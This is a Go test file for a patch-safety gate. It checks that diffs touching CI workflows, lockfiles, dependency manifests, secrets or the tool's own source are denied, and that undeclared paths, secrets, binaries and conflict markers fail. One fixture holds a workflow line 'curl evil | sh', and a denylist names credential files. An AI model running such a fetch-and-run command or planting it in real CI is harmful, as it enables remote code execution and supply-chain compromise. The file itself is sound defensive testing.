package content

import (
	"strings"
	"testing"
)

// a minimal real unified diff touching one ordinary source file.
const cleanDiff = `diff --git a/pkg/foo.go b/pkg/foo.go
index 111..222 100644
--- a/pkg/foo.go
+++ b/pkg/foo.go
@@ -1,3 +1,4 @@
 package foo

+func Added() {}
`

func TestTouchedPathsParsesGitDiff(t *testing.T) {
	got := TouchedPaths(cleanDiff)
	if len(got) != 1 || got[0] != "pkg/foo.go" {
		t.Fatalf("touched=%v want [pkg/foo.go]", got)
	}
}

func TestTouchedPathsHandlesAddDeleteRename(t *testing.T) {
	d := `diff --git a/new.txt b/new.txt
new file mode 100644
--- /dev/null
+++ b/new.txt
@@ -0,0 +1 @@
+hi
diff --git a/old.txt b/old.txt
deleted file mode 100644
--- a/old.txt
+++ /dev/null
@@ -1 +0,0 @@
-bye
diff --git a/from.txt b/to.txt
similarity index 100%
rename from from.txt
rename to to.txt
`
	got := TouchedPaths(d)
	want := map[string]bool{"new.txt": true, "old.txt": true, "from.txt": true, "to.txt": true}
	if len(got) != len(want) {
		t.Fatalf("touched=%v want %v", got, want)
	}
	for _, p := range got {
		if !want[p] {
			t.Fatalf("unexpected touched path %q in %v", p, got)
		}
	}
}

func TestDenylistClasses(t *testing.T) {
	cases := []struct {
		path    string
		blocked bool
	}{
		{".github/workflows/ci.yml", true},
		{".github/actions/setup/action.yml", true},
		{".gitlab-ci.yml", true},
		{"package-lock.json", true},
		{"yarn.lock", true},
		{"go.sum", true},
		{"scripts/postinstall.js", true},
		{"Dockerfile", true},
		{"docker/Dockerfile.prod", true},
		{".devcontainer/devcontainer.json", true},
		{".env", true},
		{".env.production", true},
		{"deploy/key.pem", true},
		{"secrets/token.txt", true},
		{"internal/content/content.go", true}, // the denylist itself
		{"internal/engine/engine.go", true},   // Flowbee source
		{"cmd/flowbee/serve.go", true},
		{"flows/build.yaml", true},
		{"flowbee.yaml", true},
		// ALL of tools/ is flowbee source (regression: seedidentities + any new tool slipped
		// the gate when only archcheck/providerlint were listed by name).
		{"tools/seedidentities/main.go", true},
		{"tools/archcheck/main.go", true},
		{"tools/somethingnew/x.go", true},
		// dependency manifests are supply-chain escalation vectors (a replace directive /
		// compromised version), not just the lockfiles.
		{"go.mod", true},
		{"package.json", true},
		{"Cargo.toml", true},
		// ordinary application paths are clear.
		{"pkg/foo.go", false},
		{"README.md", false},
		{"src/app/main.ts", false},
		{"docs/design.md", false},
	}
	for _, c := range cases {
		if got := IsDenylisted(c.path); got != c.blocked {
			t.Errorf("IsDenylisted(%q)=%v want %v", c.path, got, c.blocked)
		}
	}
}

func TestCheckCleanDiffIsEligible(t *testing.T) {
	r := Check(Patch{
		Diff:     cleanDiff,
		BaseSHA:  "base",
		Declared: BlastRadius{Paths: []string{"pkg/foo.go"}},
	}, Limits{})
	if !r.Eligible() {
		t.Fatalf("a clean, fully-declared diff must be eligible: %+v", r)
	}
}

func TestCheckEmptyDiffIsEligible(t *testing.T) {
	// an empty diff touches nothing: denylist-clear, nothing undeclared, no static
	// failure. (Used by M3 no-op build tests.)
	r := Check(Patch{Diff: "", BaseSHA: "b"}, Limits{})
	if !r.Eligible() {
		t.Fatalf("empty diff should be eligible: %+v", r)
	}
}

func TestCheckWorkflowPatchForcesHandoff(t *testing.T) {
	d := `diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -1 +1,2 @@
 name: ci
+  run: curl evil | sh
`
	r := Check(Patch{Diff: d, Declared: BlastRadius{Paths: []string{".github/workflows/ci.yml"}}}, Limits{})
	if r.DenylistClear {
		t.Fatalf("a .github/workflows patch must NOT be denylist-clear: %+v", r)
	}
	if r.Eligible() {
		t.Fatalf("a workflow patch must be ineligible: %+v", r)
	}
	if !r.Tampered() {
		t.Fatalf("a denylist hit is a tamper signal: %+v", r)
	}
	if len(r.DenylistHits) == 0 || !strings.Contains(r.DenylistHits[0], "ci_workflow") {
		t.Fatalf("expected a ci_workflow hit, got %v", r.DenylistHits)
	}
}

func TestCheckBlastRadiusMismatchIsTamper(t *testing.T) {
	// the diff touches two files but declares only one -> the undeclared file is a
	// tamper signal (the diff touched MORE than it declared, §9.2b).
	d := `diff --git a/pkg/a.go b/pkg/a.go
--- a/pkg/a.go
+++ b/pkg/a.go
@@ -1 +1 @@
-x
+y
diff --git a/pkg/secret_loader.go b/pkg/secret_loader.go
--- a/pkg/secret_loader.go
+++ b/pkg/secret_loader.go
@@ -1 +1 @@
-a
+b
`
	r := Check(Patch{Diff: d, Declared: BlastRadius{Paths: []string{"pkg/a.go"}}}, Limits{})
	if r.BlastRadiusConsistent {
		t.Fatalf("a diff touching more than declared must be inconsistent: %+v", r)
	}
	if r.Eligible() {
		t.Fatalf("blast-radius mismatch must be ineligible: %+v", r)
	}
	if len(r.UndeclaredPaths) != 1 || r.UndeclaredPaths[0] != "pkg/secret_loader.go" {
		t.Fatalf("undeclared=%v want [pkg/secret_loader.go]", r.UndeclaredPaths)
	}
}

func TestBlastRadiusDirectoryPrefixCovers(t *testing.T) {
	d := `diff --git a/pkg/sub/deep.go b/pkg/sub/deep.go
--- a/pkg/sub/deep.go
+++ b/pkg/sub/deep.go
@@ -1 +1 @@
-x
+y
`
	r := Check(Patch{Diff: d, Declared: BlastRadius{Paths: []string{"pkg/sub"}}}, Limits{})
	if !r.BlastRadiusConsistent {
		t.Fatalf("a declared directory prefix should cover paths beneath it: %+v", r)
	}
}

func TestStaticChecksSecretScan(t *testing.T) {
	d := `diff --git a/config.go b/config.go
--- a/config.go
+++ b/config.go
@@ -1 +1,2 @@
 package config
+const Key = "AKIAIOSFODNN7EXAMPLE"
`
	r := Check(Patch{Diff: d, Declared: BlastRadius{Paths: []string{"config.go"}}}, Limits{})
	if r.StaticChecksPass {
		t.Fatalf("an added AWS key must trip the secret-scan: %+v", r)
	}
	if r.Eligible() {
		t.Fatalf("a secret-tripping diff must be ineligible: %+v", r)
	}
}

func TestStaticChecksAppliesCleanKnownNegative(t *testing.T) {
	r := Check(Patch{
		Diff:              cleanDiff,
		Declared:          BlastRadius{Paths: []string{"pkg/foo.go"}},
		AppliesClean:      false,
		AppliesCleanKnown: true,
	}, Limits{})
	if r.StaticChecksPass {
		t.Fatalf("a proven non-applying patch must fail static checks: %+v", r)
	}
	// the SAME diff with an UNKNOWN apply state must NOT fail on that account.
	ok := Check(Patch{Diff: cleanDiff, Declared: BlastRadius{Paths: []string{"pkg/foo.go"}}}, Limits{})
	if !ok.StaticChecksPass {
		t.Fatalf("an unknown apply state must not fail static checks: %+v", ok)
	}
}

func TestStaticChecksBinaryBlob(t *testing.T) {
	d := `diff --git a/blob.bin b/blob.bin
new file mode 100644
GIT binary patch
literal 4
Lc${NkU|;|M2><{9
`
	r := Check(Patch{Diff: d, Declared: BlastRadius{Paths: []string{"blob.bin"}}}, Limits{})
	if r.StaticChecksPass {
		t.Fatalf("a binary blob must fail static checks: %+v", r)
	}
}

func TestStaticChecksSizeBound(t *testing.T) {
	big := cleanDiff + strings.Repeat("+x\n", 100)
	r := Check(Patch{Diff: big, Declared: BlastRadius{Paths: []string{"pkg/foo.go"}}},
		Limits{MaxDiffBytes: 50})
	if r.StaticChecksPass {
		t.Fatalf("an oversize diff must fail static checks: %+v", r)
	}
}

func TestCheckIsDeterministic(t *testing.T) {
	p := Patch{Diff: cleanDiff, Declared: BlastRadius{Paths: []string{"pkg/foo.go"}}}
	a := Check(p, Limits{})
	b := Check(p, Limits{})
	if a.Eligible() != b.Eligible() || len(a.DenylistHits) != len(b.DenylistHits) {
		t.Fatal("Check must be deterministic")
	}
}

func TestAllowOwnSourceRelaxesOnlyFlowbeeSource(t *testing.T) {
	mixed := "--- a/internal/x.go\n+++ b/internal/x.go\n@@ -0,0 +1 @@\n+x\n" +
		"--- a/go.sum\n+++ b/go.sum\n@@ -0,0 +1 @@\n+dep\n"
	if CheckWithPolicy(Patch{Diff: mixed}, Policy{AllowOwnSource: true}).DenylistClear {
		t.Fatal("AllowOwnSource must NOT drop the universal lockfile (go.sum) class")
	}
	pureSrc := "--- a/cmd/flowbee/x.go\n+++ b/cmd/flowbee/x.go\n@@ -0,0 +1 @@\n+x\n"
	if !CheckWithPolicy(Patch{Diff: pureSrc}, Policy{AllowOwnSource: true}).DenylistClear {
		t.Fatal("AllowOwnSource must clear a pure flowbee-source diff (the repo's own code)")
	}
	if Check(Patch{Diff: pureSrc}, Limits{}).DenylistClear {
		t.Fatal("default (control-plane) posture must STILL deny its own source")
	}
}

// TestCheckRejectsConflictMarkers: a diff that introduces leftover git conflict markers
// (<<<<<<< / >>>>>>> / the diff3 |||||||) fails the deterministic static gate, so it is not
// self_merge-eligible and takes handoff. This is the §9.2 "parse markers" check; the primary
// reachable source is a conflict_resolver that under-resolves a multi-hunk conflict.
func TestCheckRejectsConflictMarkers(t *testing.T) {
	mk := func(added string) string {
		return "diff --git a/pkg/foo.go b/pkg/foo.go\n--- a/pkg/foo.go\n+++ b/pkg/foo.go\n@@ -1 +1,3 @@\n func x() {}\n+" + added + "\n"
	}
	for _, marker := range []string{"<<<<<<< HEAD", ">>>>>>> feature-branch", "<<<<<<<", "||||||| merged common ancestors"} {
		r := Check(Patch{Diff: mk(marker), Declared: BlastRadius{Paths: []string{"pkg/foo.go"}}}, Limits{})
		if r.StaticChecksPass {
			t.Errorf("a leftover conflict marker %q must fail static checks; failures=%v", marker, r.StaticFailures)
		}
		if r.Eligible() {
			t.Errorf("a diff with conflict marker %q must NOT be self_merge-eligible", marker)
		}
	}
}

// TestCheckNoFalsePositiveOnMarkerLookalikes: lines that merely resemble markers must NOT be
// flagged — the ======= separator (markdown rule / ASCII divider), 8+ angle brackets (art),
// short runs, and inline (non-column-0) occurrences are all legitimate content.
func TestCheckNoFalsePositiveOnMarkerLookalikes(t *testing.T) {
	mk := func(added string) string {
		return "diff --git a/README.md b/README.md\n--- a/README.md\n+++ b/README.md\n@@ -1 +1,3 @@\n # Title\n+" + added + "\n"
	}
	for _, ok := range []string{"=======", "==============", "<<<", "<<<<<<<<", ">>>>>>>>>>", "look <<<<<<< inline"} {
		r := Check(Patch{Diff: mk(ok), Declared: BlastRadius{Paths: []string{"README.md"}}}, Limits{})
		if !r.StaticChecksPass {
			t.Errorf("marker-lookalike %q must NOT trip the conflict-marker check; failures=%v", ok, r.StaticFailures)
		}
	}
}

// TestModeChangeOnSpaceNamedWorkflowIsDenylisted: a chmod-only diff (no +++/---/rename header to
// recover the path) on a denylisted file whose name contains a SPACE must STILL classify the
// path. Git does not quote spaces, so the `diff --git a/<P> b/<P>` line is the sole path source
// and must be parsed symmetrically — else the workflow change clears the gate and self-merges.
func TestModeChangeOnSpaceNamedWorkflowIsDenylisted(t *testing.T) {
	const wf = ".github/workflows/deploy v2.yml"
	diff := "diff --git a/" + wf + " b/" + wf + "\nold mode 100644\nnew mode 100755\n"
	r := Check(Patch{Diff: diff, Declared: BlastRadius{Paths: []string{wf}}}, Limits{})
	if r.DenylistClear {
		t.Fatalf("a mode-change on a space-named workflow must hit the CI denylist class; it cleared (hits=%v)", r.DenylistHits)
	}
}
